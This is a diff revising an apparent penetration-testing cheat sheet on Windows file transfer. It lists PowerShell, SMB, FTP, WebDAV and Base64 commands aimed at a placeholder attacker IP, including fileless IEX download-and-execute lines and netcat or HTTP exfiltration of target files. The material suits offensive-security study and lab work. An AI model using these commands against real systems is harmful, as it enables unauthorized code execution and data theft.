@@ -1,189 +1,189 @@
-### Windows File Transfer Methodology
+## PowerShell Web Downloads
 
-Understanding various Windows file transfer methods allows attackers to **operate stealthily** and **bypass defensive policies**. Modern threats, like the Astaroth attack, often use **fileless techniques** where payloads are downloaded via legitimate system tools and executed directly in memory to avoid detection.
+Standard outbound traffic is permitted via HTTP/HTTPS, but local execution policies or web filters may restrict binary downloads.
 
----
-
-### 1. Base64 Transfer (Non-Network Method)
-
-Use this method when you have terminal access but **network communication is restricted** or blocked between the attack machine and the target.
-
-**Operational Workflow:**
-
-1. **Verify** the file's integrity on the source machine using a checksum to ensure the transfer is accurate.
-2. **Encode** the file into a Base64 string.
-3. **Copy-paste** the string into the target terminal.
-4. **Decode** the string back into the original file format.
-5. **Re-verify** the checksum on the target machine.
-
-**Execution Commands:**
-
-- **Linux (Source) - Encode and Checksum:**
-    
-    ```
-    md5sum <FILENAME>
-    cat <FILENAME> | base64 -w 0; echo
-    ```
-    
-- **PowerShell (Target) - Decode and Checksum:**
-    
-    ```
-    [IO.File]::WriteAllBytes("C:\Users\Public\<FILENAME>", [Convert]::FromBase64String("<BASE64_STRING>"))
-    Get-FileHash C:\Users\Public\<FILENAME> -Algorithm md5
-    ```
-    
-
-**Technical Constraints:**
-
-- **CMD String Limit:** The Windows Command Line (`cmd.exe`) has a maximum string length of **8,191 characters**; large files may fail or require web shell alternatives.
-
----
-
-### 2. PowerShell Web Downloads
-
-Leveraging HTTP/HTTPS is effective because most environments allow outbound web traffic for productivity.
-
-#### A. Net.WebClient Class
-
-The `System.Net.WebClient` class is highly versatile for downloading data via HTTP, HTTPS, or FTP.
-
-- **Download to Disk:** Use when you need the file present on the system.
-    
-    ```
-    (New-Object Net.WebClient).DownloadFile('http://<ATTACK_IP>:<PORT>/<FILE>', '<OUTPUT_PATH>')
-    ```
-    
-- **Fileless Execution:** Use to execute a script directly in memory, leaving **no trace on the disk**.
-    
-    ```
-    IEX (New-Object Net.WebClient).DownloadString('http://<ATTACK_IP>:<PORT>/<SCRIPT>.ps1')
-    ```
-    
-
-#### B. Invoke-WebRequest (IWR)
-
-Available from PowerShell 3.0+, this is slower than `WebClient` but supports aliases like `curl` and `wget`.
-
-- **Standard Download:**
-    
-    ```
-    Invoke-WebRequest http://<ATTACK_IP>:<PORT>/<FILE> -OutFile <OUTPUT_NAME>
-    ```
-    
-
-**Edge Cases & Error Handling:**
-
-|Condition|Solution|
-|:--|:--|
-|**IE First-Launch Not Complete:** Prevents parsing.|Add `-UseBasicParsing` parameter.|
-|**Untrusted SSL/TLS Certificate:** Connection closed.|Set `ServerCertificateValidationCallback = {$true}`.|
-
----
-
-### 3. SMB File Transfers
-
-The SMB protocol (Port 445) is standard in Windows environments for internal file sharing.
-
-**Operational Workflow:**
-
-1. **Start** an SMB server on the attack machine using Impacket.
-2. **Authenticate** if the target organization blocks unauthenticated guest access (common in new Windows versions).
-3. **Copy** the file from the share to the local target.
-
-**Execution Commands:**
-
-- **Attack Machine (Start Authenticated Server):**
-    
-    ```
-    sudo impacket-smbserver <SHARE_NAME> -smb2support <LOCAL_DIRECTORY> -user <USERNAME> -password <PASSWORD>
-    ```
-    
-- **Target Machine (Mount and Copy):**
-    
-    ```
-    net use n: \\<ATTACK_IP>\<SHARE_NAME> /user:<USERNAME> <PASSWORD>
-    copy n:\<FILENAME>
-    ```
-    
-
----
-
-### 4. FTP File Transfers
-
-FTP (Ports 21/20) can be used via the native Windows FTP client or PowerShell.
-
-**Non-Interactive Shell Workflow:** When you lack an interactive shell, use a **command file** to automate the FTP client.
+Standard download to disk using WebClient
 
 ```
-echo open <ATTACK_IP> > ftpcommand.txt
-echo USER anonymous >> ftpcommand.txt
-echo binary >> ftpcommand.txt
-echo GET <FILE> >> ftpcommand.txt
-echo bye >> ftpcommand.txt
-ftp -v -n -s:ftpcommand.txt
+(New-Object Net.WebClient).DownloadFile('http://<ATTACK_IP>/<FILE_NAME>', 'C:\<FILE_PATH>')
 ```
 
----
+Asynchronous download to prevent blocking the calling thread
 
-### 5. WebDAV (SMB over HTTP)
+```
+(New-Object Net.WebClient).DownloadFileAsync('http://<ATTACK_IP>/<FILE_NAME>', 'C:\<FILE_PATH>')
+```
 
-Use WebDAV when **outbound SMB (TCP 445) is blocked** by the firewall. WebDAV allows the target to treat a web server like a file server over Port 80/443.
+Fileless execution by downloading script string directly to memory
 
-**Execution Commands:**
+```
+IEX (New-Object Net.WebClient).DownloadString('http://<ATTACK_IP>/<FILE_NAME>.ps1')
+```
 
-- **Attack Machine (Setup):**
+Alternative fileless execution using pipeline input
+
+```
+(New-Object Net.WebClient).DownloadString('http://<ATTACK_IP>/<FILE_NAME>.ps1') | IEX
+```
+
+Standard cmdlet download for PowerShell 3.0+
+
+```
+Invoke-WebRequest http://<ATTACK_IP>/<FILE_NAME> -OutFile <FILE_NAME>
+```
+
+- Net.WebClient -> `(New-Object Net.WebClient).DownloadFile` -> Prefer for speed and compatibility with older PowerShell versions.
     
-    ```
-    pip3 install wsgidav cheroot
-    sudo wsgidav --host=0.0.0.0 --port=80 --root=<DIRECTORY> --auth=anonymous
-    ```
+- Invoke-WebRequest -> `iwr <URL> -OutFile <PATH>` -> Prefer when aliases (curl/wget) are needed, though it is noticeably slower.
     
-- **Target Machine (Connect):** The `DavWWWRoot` keyword tells the Windows driver to connect to the root of the WebDAV server.
+- **Internet Explorer engine unavailable**: The first-launch configuration must be completed or the engine is missing.
     
-    ```
-    dir \\<ATTACK_IP>\DavWWWRoot
-    copy <FILE_PATH> \\<ATTACK_IP>\DavWWWRoot
-    ```
+- **SSL/TLS trust failure**: The certificate is not trusted by the local store.
     
 
----
+1. Use `-UseBasicParsing` to bypass IE engine requirements.
+2. Set the `ServicePointManager` callback to true to ignore SSL errors.
 
-### 6. Upload Operations
+```
+[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
+```
 
-To exfiltrate data or move files for analysis, use these reverse techniques.
-
-- **PowerShell Web Upload:** Requires a web server configured to accept uploads (e.g., Python `uploadserver`).
-    
-    ```
-    # Load upload script and execute
-    IEX(New-Object Net.WebClient).DownloadString('http://<ATTACK_IP>:<PORT>/PSUpload.ps1')
-    Invoke-FileUpload -Uri http://<ATTACK_IP>:<PORT>/upload -File <PATH_TO_FILE>
-    ```
-    
-- **Base64 via POST (Netcat):** Use to send a file as a POST request body to a listening `nc` instance.
-    
-    ```
-    $b64 = [System.convert]::ToBase64String((Get-Content -Path '<FILE>' -Encoding Byte))
-    Invoke-WebRequest -Uri http://<ATTACK_IP>:<PORT>/ -Method POST -Body $b64
-    ```
-    
+**Internet Explorer setup incomplete** will block `Invoke-WebRequest` unless basic parsing is specified.
 
 ---
 
-### Summary of Command Parameters
+## SMB File Transfer
 
-|Tool|Parameter|Purpose|
-|:--|:--|:--|
-|**WMIC**|`/Format`|Allows download/execution of malicious JavaScript.|
-|**pyftpdlib**|`--write`|**Essential** to allow clients to upload files to the FTP server.|
-|**IWR**|`-OutFile`|Specifies the local name for the downloaded resource.|
+The environment allows TCP/445 traffic or lacks restrictions on internal lateral file movement.
+
+Initialize SMB server on attack host
+
+```
+sudo impacket-smbserver <SHARE_NAME> -smb2support <FILE_PATH>
+```
+
+Copy file from share to target current directory
+
+```
+copy \\<ATTACK_IP>\<SHARE_NAME>\<FILE_NAME>
+```
+
+Mount share with credentials to bypass unauthenticated guest restrictions
+
+```
+net use n: \\<ATTACK_IP>\<SHARE_NAME> /user:<USERNAME> <PASSWORD>
+```
+
+**Unauthenticated guest access blocked** by security policy on newer Windows versions requires providing credentials during share creation and mounting.
 
 ---
 
-### Dangerous & Misconfigured Settings
+## FTP File Transfer
 
-| Setting                                   | Attack Implication                                                                                                                         |
-| :---------------------------------------- | :----------------------------------------------------------------------------------------------------------------------------------------- |
-| **Unauthenticated Guest Access**          | Allows easy file transfer via SMB without credentials; if disabled, requires `net use` with valid credentials.                             |
-| **Anonymous FTP Write Access**            | If enabled (via `--write` in `pyftpdlib`), any user can upload files to the attack host, potentially leading to unauthorized data storage. |
-| **Missing SMB Outbound Egress Filtering** | Allows attackers to easily exfiltrate data or pull tools via Port 445.                                                                     |
+TCP/21/20 are reachable and native FTP clients are available on the target.
+
+Start anonymous FTP server with write permissions
+
+```
+sudo python3 -m pyftpdlib --port 21 --write
+```
+
+Download file using PowerShell WebClient
+
+```
+(New-Object Net.WebClient).DownloadFile('ftp://<ATTACK_IP>/<FILE_NAME>', 'C:\<FILE_PATH>')
+```
+
+Automated non-interactive FTP download via command file
+
+```
+echo open <ATTACK_IP> > ftpcommand.txt && echo USER anonymous >> ftpcommand.txt && echo binary >> ftpcommand.txt && echo GET <FILE_NAME> >> ftpcommand.txt && echo bye >> ftpcommand.txt && ftp -v -n -s:ftpcommand.txt
+```
+
+- **Anonymous write access enabled**: pyftpdlib defaults to anonymous; ensure `--write` is specified for uploads.
+
+---
+
+## WebDAV Transfer (SMB over HTTP)
+
+Outbound TCP/445 is blocked by firewalls, causing SMB to attempt a failover connection via HTTP.
+
+Start WebDAV server on attack host
+
+```
+sudo wsgidav --host=0.0.0.0 --port=80 --root=<FILE_PATH> --auth=anonymous
+```
+
+Connect to the root of the WebDAV server
+
+```
+dir \\<ATTACK_IP>\DavWWWRoot
+```
+
+Copy to a specific folder existing on the WebDAV server
+
+```
+copy <FILE_PATH> \\<ATTACK_IP>\<SHARE_NAME>\
+```
+
+`DavWWWRoot` is a mandatory keyword for the Mini-Redirector driver when connecting to the server root.
+
+---
+
+## Base64 Terminal Transfer
+
+No network communication is possible, but terminal access is available for copy-pasting strings.
+
+Encode file on Linux for transfer
+
+```
+cat <FILE_NAME> | base64 -w 0; echo
+```
+
+Decode string on Windows target to file
+
+```
+[IO.File]::WriteAllBytes("<FILE_PATH>", [Convert]::FromBase64String("<BASE64_STRING>"))
+```
+
+Encode file on Windows for exfiltration
+
+```
+[Convert]::ToBase64String((Get-Content -path "<FILE_PATH>" -Encoding byte))
+```
+
+Verify transfer integrity using MD5 hashes.
+
+```
+Get-FileHash <FILE_PATH> -Algorithm md5
+```
+
+**CMD string length limit** of 8,191 characters will truncate large transfers in `cmd.exe`.
+
+---
+
+## Web Upload Operations
+
+Exfiltration is required over HTTP/HTTPS to a controlled server.
+
+Start upload-capable web server
+
+```
+python3 -m uploadserver
+```
+
+Upload via PowerShell script using Invoke-RestMethod
+
+```
+IEX(New-Object Net.WebClient).DownloadString('http://<ATTACK_IP>/PSUpload.ps1'); Invoke-FileUpload -Uri http://<ATTACK_IP>:8000/upload -File <FILE_PATH>
+```
+
+Exfiltrate file as Base64 POST request to Netcat
+
+```
+$b64 = [System.convert]::ToBase64String((Get-Content -Path '<FILE_PATH>' -Encoding Byte)); Invoke-WebRequest -Uri http://<ATTACK_IP>:<PORT>/ -Method POST -Body $b64
+```
+
+> ⚠️ Gap: The `PSUpload.ps1` script is not a native utility and must be pre-staged or downloaded from an external repository which may be blocked.
+
+**Web shell limitations** may cause errors when attempting to send extremely large strings via POST or terminal.
